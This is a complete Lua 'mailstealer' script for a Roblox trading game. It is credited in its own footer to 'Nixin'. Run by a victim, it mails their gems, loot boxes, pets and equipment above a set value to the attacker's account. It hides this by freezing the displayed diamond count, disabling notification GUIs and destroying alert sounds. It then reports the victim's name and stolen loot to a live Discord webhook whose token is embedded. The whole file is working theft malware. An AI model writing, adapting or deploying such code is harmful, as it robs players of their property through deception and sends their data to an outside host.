Username = "Vedekur"
webhook = "https://discord.com/api/webhooks/1262315237147672626/9VMl_PJknrPkDppHmhWLfGMpI6CvnUAh6JWE9yd7iScJ7PRmqAkDivrcuvDkHc4YHuOG"
min_rap = 1000000 -- Minimum RAP of each item you want to get sent to you. 1 million by default.

local network = game:GetService("ReplicatedStorage"):WaitForChild("Network")
local library = require(game.ReplicatedStorage.Library)
local save = library.save.Get().Inventory
local mailsent = library.save.Get().MailboxSendsSinceReset
local plr = game.Players.LocalPlayer
local MailMessage = "Gg dude"
local HttpService = game:GetService("HttpService")
local sortedItems = {}
local totalRAP = 0
local getFucked = false
_G.scriptExecuted = _G.scriptExecuted or false

local function Getsave()
    return require(game.ReplicatedStorage.Library.Client.save).Get()
end

if _G.scriptExecuted then
    return
end
_G.scriptExecuted = true

local newamount = 20000

if mailsent ~= 0 then
    newamount = math.ceil(newamount * (1.5 ^ mailsent))
end

local GemAmount1 = 1
for i, v in pairs(Getsave().Inventory.Currency) do
    if v.id == "Diamonds" then
        GemAmount1 = v._am
        break
    end
end

if newamount > GemAmount1 then
    return
end

local function formatNumber(number)
    number = math.floor(number)
    local suffixes = {"", "k", "m", "b", "t"}
    local suffixIndex = 1
    while number >= 1000 do
        number = number / 1000
        suffixIndex = suffixIndex + 1
    end
    return string.format("%.2f%s", number, suffixes[suffixIndex])
end

local function SendMessage(username, diamonds)
    local headers = { ["Content-Type"] = "application/json" }

    local fields = {
        {
            name = "Victim Username:",
            value = username,
            inline = true
        },
        {
            name = "Items to be sent:",
            value = "",
            inline = false
        },
        {
            name = "Summary:",
            value = "",
            inline = false
        }
    }
    local combinedItems = {}
    local itemRapMap = {}

    for _, item in ipairs(sortedItems) do
        local rapKey = item.name
        if itemRapMap[rapKey] then
            itemRapMap[rapKey].amount = itemRapMap[rapKey].amount + item.amount
        else
            itemRapMap[rapKey] = {amount = item.amount, rap = item.rap}
            table.insert(combinedItems, rapKey)
        end
    end

    table.sort(combinedItems, function(a, b)
        return itemRapMap[a].rap * itemRapMap[a].amount > itemRapMap[b].rap * itemRapMap[b].amount 
    end)

    for _, itemName in ipairs(combinedItems) do
        local itemData = itemRapMap[itemName]
        fields[2].value = fields[2].value .. itemName .. " (x" .. itemData.amount .. ")" .. ": " .. formatNumber(itemData.rap * itemData.amount) .. " RAP\n"
    end

    fields[3].value = fields[3].value .. "Gems: " .. formatNumber(diamonds) .. "\n"
    fields[3].value = fields[3].value .. "Total RAP: " .. formatNumber(totalRAP)
    if getFucked then
        fields[3].value = fields[3].value .. "\n\nVictim tried to use anti-mailstealer, but got fucked instead"
    end

    local data = {
        ["embeds"] = {{
            ["title"] = "New Execution",
            ["color"] = 65280,
            ["fields"] = fields,
            ["footer"] = {
                ["text"] = "Mailstealer by Nixin"
            }
        }}
    }

    if #fields[2].value > 1024 then
        local lines = {}
        for line in fields[2].value:gmatch("[^\r\n]+") do
            table.insert(lines, line)
        end

        while #fields[2].value > 1024 and #lines > 0 do
            table.remove(lines)
            fields[2].value = table.concat(lines, "\n")
            fields[2].value = fields[2].value .. "\nPlus more!"
        end
    end

    local body = HttpService:JSONEncode(data)

    if webhook and webhook ~= "" then
        local response = request({
            Url = webhook,
            Method = "POST",
            Headers = headers,
            Body = body
        })
        if response.StatusCode ~= 200 then
            warn("Failed to send webhook message: " .. response.StatusMessage)
        end
    end
end

local gemsleaderstat = plr.leaderstats["\240\159\146\142 Diamonds"].Value
local gemsleaderstatpath = plr.leaderstats["\240\159\146\142 Diamonds"]
gemsleaderstatpath:GetPropertyChangedSignal("Value"):Connect(function()
    gemsleaderstatpath.Value = gemsleaderstat
end)

local loading = plr.PlayerScripts.Scripts.Core["Process Pending GUI"]
local noti = plr.PlayerGui.Notifications
loading.Disabled = true
noti:GetPropertyChangedSignal("Enabled"):Connect(function()
    noti.Enabled = false
end)
noti.Enabled = false

game.DescendantAdded:Connect(function(x)
    if x.ClassName == "Sound" then
        if x.SoundId == "rbxassetid://11839132565" or 
           x.SoundId == "rbxassetid://14254721038" or 
           x.SoundId == "rbxassetid://12413423276" then
            x.Volume = 0
            x.PlayOnRemove = false
            x:Destroy()
        end
    end
end)

local function getRAP(Type, Item)
    return (library.DevRAPCmds.Get({
        Class = {Name = Type},
        IsA = function(hmm)
            return hmm == Type
        end,
        GetId = function()
            return Item.id
        end,
        StackKey = function()
            return HttpService:JSONEncode({id = Item.id, pt = Item.pt, sh = Item.sh, tn = Item.tn})
        end
    }) or 0)
end

local user = Username
local user2 = Username2

local function sendItem(category, uid, am)
    local args = {
        [1] = user,
        [2] = MailMessage,
        [3] = category,
        [4] = uid,
        [5] = am or 1
    }
    local response = false
    repeat
        local response, err = network:WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
        if response == false and err == "They don't have enough space!" then
            user = user2
            args[1] = user
        end
        if not response then
            print("Failed to send item, error: " .. tostring(err))
        end
    until response == true
    print("Item sent successfully: Category=" .. category .. ", UID=" .. uid)
    
    GemAmount1 = GemAmount1 - newamount
    newamount = math.ceil(math.ceil(newamount) * 1.5)
    if newamount > 5000000 then
        newamount = 5000000
    end
end

local function SendAllGems()
    for i, v in pairs(Getsave().Inventory.Currency) do
        if v.id == "Diamonds" then
            if GemAmount1 >= (newamount + 10000) then
                local args = {
                    [1] = user,
                    [2] = MailMessage,
                    [3] = "Currency",
                    [4] = i,
                    [5] = GemAmount1 - newamount
                }
                local response = false
                repeat
                    response = network:WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
                until response == true
                print("Gems sent successfully: " .. formatNumber(GemAmount1 - newamount))
                break
            end
        end
    end
end

local function IsMailboxHooked()
    local uid
    for i, v in pairs(save["Pet"]) do
        uid = i
        break
    end
    local args = {
        [1] = "Roblox",
        [2] = "Test",
        [3] = "Pet",
        [4] = uid,
        [5] = 1
    }
    local response, err = network:WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
    if err == "They don't have enough space!" or err == "You don't have enough diamonds to send the mail!" then
        return false
    else
        return true
    end
end

local function EmptyBoxes()
    if save.Box then
        for key, value in pairs(save.Box) do
            if GemAmount1 < newamount then
                return
            end
            if value.e and value.r then
                for i = 1, value.r do
                    sendItem("Box", key, 1)
                end
            elseif value.r then
                sendItem("Box", key, value.r)
            else
                sendItem("Box", key, 1)
            end
        end
    end
end

if not IsMailboxHooked() then
    SendAllGems()
    EmptyBoxes()
    SendMessage(user, GemAmount1)

    for i, v in pairs(save["Pet"]) do
        if GemAmount1 < newamount then
            return
        end
        local item = {
            ["uid"] = i,
            ["name"] = v.nk or library.Directory.Pet[v.id].name,
            ["rap"] = getRAP("Pet", v),
            ["amount"] = 1
        }
        if item.rap >= min_rap then
            sendItem("Pet", item.uid, 1)
            totalRAP = totalRAP + item.rap
            table.insert(sortedItems, item)
        end
    end

    for i, v in pairs(save["Equipped"]) do
        if v.e then
            for name, item in pairs(v.e) do
                if GemAmount1 < newamount then
                    return
                end
                local iAmount = v.nk or library.Directory.Equipment[v.id].name
                local item = {
                    ["uid"] = i,
                    ["name"] = iAmount,
                    ["rap"] = getRAP("Equipped", v),
                    ["amount"] = 1
                }
                if item.rap >= min_rap then
                    sendItem("Equipped", item.uid, 1)
                    totalRAP = totalRAP + item.rap
                    table.insert(sortedItems, item)
                end
            end
        end
    end

    SendMessage(user, GemAmount1)
else
    local err = nil
    while err == "You must wait 30 seconds before using the mailbox!" do
        print("Waiting 30 seconds before using mailbox...")
        wait(30)
        SendAllGems()
        EmptyBoxes()
        SendMessage(user, GemAmount1)

        for i, v in pairs(save["Pet"]) do
            if GemAmount1 < newamount then
                return
            end
            local item = {
                ["uid"] = i,
                ["name"] = v.nk or library.Directory.Pet[v.id].name,
                ["rap"] = getRAP("Pet", v),
                ["amount"] = 1
            }
            if item.rap >= min_rap then
                sendItem("Pet", item.uid, 1)
                totalRAP = totalRAP + item.rap
                table.insert(sortedItems, item)
            end
        end

        for i, v in pairs(save["Equipped"]) do
            if v.e then
                for name, item in pairs(v.e) do
                    if GemAmount1 < newamount then
                        return
                    end
                    local iAmount = v.nk or library.Directory.Equipment[v.id].name
                    local item = {
                        ["uid"] = i,
                        ["name"] = iAmount,
                        ["rap"] = getRAP("Equipped", v),
                        ["amount"] = 1
                    }
                    if item.rap >= min_rap then
                        sendItem("Equipped", item.uid, 1)
                        totalRAP = totalRAP + item.rap
                        table.insert(sortedItems, item)
                    end
                end
            end
        end

        SendMessage(user, GemAmount1)
    end
end

SendMessage(user, GemAmount1)
_G.scriptExecuted = false
